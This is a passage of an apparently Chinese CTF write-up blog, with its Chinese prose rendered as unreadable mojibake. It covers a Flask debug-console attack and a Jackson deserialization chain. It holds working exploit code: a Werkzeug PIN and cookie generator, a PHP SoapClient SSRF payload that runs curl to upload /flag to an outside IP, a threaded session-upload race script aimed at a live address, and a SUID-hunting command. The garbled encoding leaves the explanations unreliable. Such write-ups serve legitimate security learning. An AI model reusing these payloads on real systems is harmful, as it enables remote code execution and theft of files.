åå…­è¿›åˆ¶è½¬åè¿›åˆ¶</span></span><br><span class="line">       <span class="string">&quot;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&quot;</span></span><br><span class="line">]<span class="comment">#è¯»å–/proc/sys/kernel/random/boot_idå’Œ/proc/self/cgroupæ‹¼æ¥è€Œæˆ</span></span><br></pre></td></tr></table></figure><p>å†å°†æºç éƒ¨åˆ†æ”¹åŠ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;app&quot;</span>,<span class="comment">#/etc/passwd</span></span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,<span class="comment">#é»˜è®¤</span></span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,<span class="comment">#é»˜è®¤</span></span><br><span class="line">        <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> ,<span class="comment">#ä¸€ä¸ªè·¯å¾„ä¿¡æ¯</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;2485378023426&quot;</span>, <span class="comment">#/sys/class/net/eth0/address åå…­è¿›åˆ¶è½¬åè¿›åˆ¶</span></span><br><span class="line">       <span class="string">&quot;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&quot;</span></span><br><span class="line">]<span class="comment">#è¯»å–/proc/sys/kernel/random/boot_idå’Œ/proc/self/cgroupæ‹¼æ¥è€Œæˆ</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"><span class="built_in">print</span>(cookie_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">121</span>-<span class="number">260</span>-<span class="number">582</span></span><br><span class="line">__wzdb2a60e2b19822632a67c</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ä»¥åï¼Œå°±å¯ä»¥æ‰“ä¸€ä¸ªsoapclientåŸç”Ÿç±»çš„ssrfäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=new SoapClient(null,array(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%27os%27).popen(%27curl%2043.143.192.19%3A1145%20-T%20/flag%27)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;shanghe\r\n&quot;</span>. <span class="string">&quot;Cookie: __wzdb2a60e2b19822632a67c=1687115222|11b8517fb9fb\r\n&quot;</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1:5000&quot;</span>));</span><br><span class="line">$b=array(<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;awd&quot;</span>,<span class="string">&quot;properties&quot;</span>=&gt;urlencode(serialize($a)));</span><br><span class="line">echo (serialize($b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># import io</span></span><br><span class="line"><span class="comment"># import threading</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://115.239.215.75:8081/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;22&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;a:2:&#123;s:4:&quot;type&quot;;s:3:&quot;awd&quot;;s:10:&quot;properties&quot;;s:567:&quot;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A21%3A%22http%3A%2F%2F127.0.0.1%3A5000%22%3Bs%3A8%3A%22location%22%3Bs%3A155%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2527os%2527%29.popen%28%2527curl%252043.143.192.19%253A1145%2520-T%2520%2Fflag%2527%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A68%3A%22shanghe%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687115222%7C11b8517fb9fb%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;;&#125;&#x27;</span>&#125;</span><br><span class="line">xiao = <span class="string">&quot;xiao&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;1.jpg&quot;</span>: <span class="string">&quot;12323131231&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: xiao&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url, data=data,files=files, cookies=cookies)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        new_url = url + <span class="string">&quot;?file=&quot;</span> + <span class="string">&quot;../Extensions/tmp/tmp/sess_&quot;</span> + xiao</span><br><span class="line">        r = session.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress_&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t1 = threading.Thread(target=read)</span><br><span class="line">    t2 = threading.Thread(target=write)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cookieå€¼çš„è·å–ï¼š<br>åœ¨æºç æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Myprobably_public_bits=[</span><br><span class="line">        <span class="string">&quot;app&quot;</span>,<span class="comment">#/etc/passwd</span></span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,<span class="comment">#é»˜è®¤</span></span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,<span class="comment">#é»˜è®¤</span></span><br><span class="line">        <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> ,<span class="comment">#ä¸€ä¸ªè·¯å¾„ä¿¡æ¯</span></span><br><span class="line">    ]</span><br><span class="line">    Myprivate_bits=  [</span><br><span class="line">    <span class="string">&quot;2485378023426&quot;</span>, <span class="comment">#/sys/class/net/eth0/address åå…­è¿›åˆ¶è½¬åè¿›åˆ¶</span></span><br><span class="line">       <span class="string">&quot;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&quot;</span></span><br><span class="line">]</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(Myprobably_public_bits, Myprivate_bits):</span><br></pre></td></tr></table></figure><p>æœ¬åœ°å¼€å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5555</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å†è®¿é—®consoleï¼Œè¾“å…¥å¯¹åº”çš„pin,æ‹¿åˆ°cookieã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p>ææƒ<br>è‡³äºsecretï¼Œé¢˜ç›®ç»™äº†ä¸ªfile_get_contentsã€‚<br>ç›´æ¥è¯»å–consoleä¼šç»™secretã€‚<br>è‡³æ­¤æ‰€æœ‰å†…å®¹å°±å®Œæ¯•äº†ã€‚</p><h2 id="æ€»ç»“"><span id="æ€»ç»“"> æ€»ç»“</span></h2><p>è¿™é¢˜ç›®åŸºæœ¬ä¸Šå®Œå…¨æ¶‰åŠæˆ‘çš„ç›²åŒºï¼Œå¤ç°å‡ºæ¥èŠ±äº†å¾ˆå¤šæ—¶é—´ã€‚ä¸è¿‡å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚</p><h1 id="hellojava"><span id="hellojava"> hellojava</span></h1><p><a href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509</a></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå…ˆæ¢³ç†ä¸€ä¸‹é“¾å­ã€‚</p><h2 id="ç†Ÿæ‚‰jackson"><span id="ç†Ÿæ‚‰jackson"> ç†Ÿæ‚‰jackson</span></h2><p>åœ¨jacksonä¸­å°†å¯¹è±¡åºåˆ—åŒ–æˆä¸€ä¸ªjsonä¸²ä¸»è¦æ˜¯ä½¿ç”¨çš„ObjectMapper#writeValueAsStringæ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public String writeValueAsString(Object value) throws JsonProcessingException &#123;</span><br><span class="line">       SegmentedStringWriter sw = new SegmentedStringWriter(this._jsonFactory._getBufferRecycler());</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           this._writeValueAndClose(this.createGenerator((Writer)sw), value);</span><br><span class="line">       &#125; catch (JsonProcessingException var4) &#123;</span><br><span class="line">           throw var4;</span><br><span class="line">       &#125; catch (IOException var5) &#123;</span><br><span class="line">           throw JsonMappingException.fromUnexpectedIOE(var5);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> sw.getAndClear();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨getteræ–¹æ³•ï¼Œè¿™å¯å¤ªå¥½äº†ï¼Œgetoutpropertiesæ˜¯æˆ‘ä»¬æƒ³è¦çš„æ¶æ„æ–¹æ³•ã€‚</p><p>å€Ÿç”¨ä¸€ä¸‹å¸ˆå‚…çš„è°ƒç”¨æ ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4568</span>, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3821</span>, ObjectMapper (com.fasterxml.jackson.databind)</span><br></pre></td></tr></table></figure><p>å‡ ä¸ªå…³é”®æ–¹æ³•ï¼š<br>defaultserializervalue:serializeValue</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public void serializeValue(JsonGenerator gen, Object value) throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        _generator = gen;</span><br><span class="line">        <span class="keyword">if</span> (value == null) &#123;</span><br><span class="line">            _serializeNull(gen);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        final Class&lt;?&gt; cls = value.getClass();</span><br><span class="line">        // true, since we do want to cache root-level typed serializers (ditto <span class="keyword">for</span> null <span class="built_in">property</span>)</span><br><span class="line">        final JsonSerializer&lt;Object&gt; ser = findTypedValueSerializer(cls, true, null);</span><br><span class="line">        PropertyName rootName = _config.getFullRootName();</span><br><span class="line">        <span class="keyword">if</span> (rootName == null) &#123; // <span class="keyword">not</span> explicitly specified</span><br><span class="line">            <span class="keyword">if</span> (_config.isEnabled(SerializationFeature.WRAP_ROOT_VALUE)) &#123;</span><br><span class="line">                _serialize(gen, value, ser, _config.findRootName(cls));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!rootName.isEmpty()) &#123;</span><br><span class="line">            _serialize(gen, value, ser, rootName);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        _serialize(gen, value, ser);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨ä¸€ä¸ªfindTypedValueSerializerï¼Œæ ¹æ®ä¼ å…¥çš„ç±»ï¼Œæ‰¾åˆ°å¯¹åº”çš„serializerï¼Œè¿™é‡Œä¼ å…¥äº†ä¸€ä¸ªPOJOå¯¹è±¡ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨beanserializerã€‚</p><h2 id="å›åˆ°é¢˜ç›®"><span id="å›åˆ°é¢˜ç›®"> å›åˆ°é¢˜ç›®</span></h2><p>æ‰“ä¸€ä¸ªtostringé“¾ï¼Œ<br>çœ‹BadAttributeValueExpException</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, null);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == null) &#123;</span><br><span class="line">            val = null;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj instanceof String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == null</span><br><span class="line">                || valObj instanceof Long</span><br><span class="line">                || valObj instanceof Integer</span><br><span class="line">                || valObj instanceof Float</span><br><span class="line">                || valObj instanceof Double</span><br><span class="line">                || valObj instanceof Byte</span><br><span class="line">                || valObj instanceof Short</span><br><span class="line">                || valObj instanceof Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; // the serialized <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">from</span> a version without JDK-<span class="number">8019292</span> fix</span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>toStringæ–¹æ³•ï¼Œè¿™é‡Œè¦è°ƒç”¨basejsonnodeçš„è¿™ä¸ªæ–¹æ³•ï¼Œç»™å…¶èµ‹å€¼ã€‚<br>åå°„ä¿®æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException exp = new BadAttributeValueExpException(null);</span><br><span class="line">        Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.<span class="built_in">set</span>(exp,jsonNodes);</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›toString</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> InternalNodeMapper.nodeToString(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">nodeToString</span><span class="params">(JsonNode n)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> STD_WRITER.writeValueAsString(n);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123; <span class="comment">// should never occur</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">writeValueAsString</span><span class="params">(Object value)</span></span><br><span class="line">        <span class="keyword">throws</span> JsonProcessingException</span><br><span class="line">    &#123;        </span><br><span class="line">        <span class="comment">// alas, we have to pull the recycler directly here...</span></span><br><span class="line">        <span class="type">SegmentedStringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SegmentedStringWriter</span>(_generatorFactory._getBufferRecycler());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            _writeValueAndClose(createGenerator(sw), value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123; <span class="comment">// shouldn&#x27;t really happen, but is declared as possibility so:</span></span><br><span class="line">            <span class="keyword">throw</span> JsonMappingException.fromUnexpectedIOE(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sw.getAndClear();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›_writeValueAndClose</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">_writeValueAndClose</span><span class="params">(JsonGenerator gen, Object value)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_config.isEnabled(SerializationFeature.CLOSE_CLOSEABLE) &amp;&amp; (value <span class="keyword">instanceof</span> Closeable)) &#123;</span><br><span class="line">            _writeCloseable(gen, value);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            _prefetch.serialize(gen, value, _serializerProvider());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            ClassUtil.closeOnFailAndThrowAsIOE(gen, e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        gen.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸€è·¯è·Ÿè¿›serializeï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serializeValue</span><span class="params">(JsonGenerator gen, Object value)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">   &#123;</span><br><span class="line">       _generator = gen;</span><br><span class="line">       <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">           _serializeNull(gen);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">final</span> Class&lt;?&gt; cls = value.getClass();</span><br><span class="line">       <span class="comment">// true, since we do want to cache root-level typed serializers (ditto for null property)</span></span><br><span class="line">       <span class="keyword">final</span> JsonSerializer&lt;Object&gt; ser = findTypedValueSerializer(cls, <span class="literal">true</span>, <span class="literal">null</span>);</span><br><span class="line">       <span class="type">PropertyName</span> <span class="variable">rootName</span> <span class="operator">=</span> _config.getFullRootName();</span><br><span class="line">       <span class="keyword">if</span> (rootName == <span class="literal">null</span>) &#123; <span class="comment">// not explicitly specified</span></span><br><span class="line">           <span class="keyword">if</span> (_config.isEnabled(SerializationFeature.WRAP_ROOT_VALUE)) &#123;</span><br><span class="line">               _serialize(gen, value, ser, _config.findRootName(cls));</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!rootName.isEmpty()) &#123;</span><br><span class="line">           _serialize(gen, value, ser, rootName);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       _serialize(gen, value, ser);</span><br><span class="line">   